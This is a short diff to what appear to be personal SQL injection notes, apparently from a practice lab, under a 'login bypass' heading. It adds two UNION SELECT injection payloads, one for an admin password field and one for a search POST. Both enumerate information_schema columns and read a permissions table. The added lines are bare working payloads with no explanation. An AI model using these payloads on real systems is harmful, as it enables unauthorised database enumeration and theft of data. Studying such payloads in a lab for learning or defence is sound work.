@@ -276,9 +276,11 @@ login bypass:
 
 
 
+admin password
+UNION SELECT table_schema,table_name,column_name FROM information_schema.columns; # UNION SELECT name,description,level FROM sqlinjection.permissions; #
 
-
-
+within the search POST
+UNION SELECT table_schema,table_name,column_name FROM information_schema.columns; # UNION SELECT name,description,level FROM sqlinjection.permissions; #
 
 
 
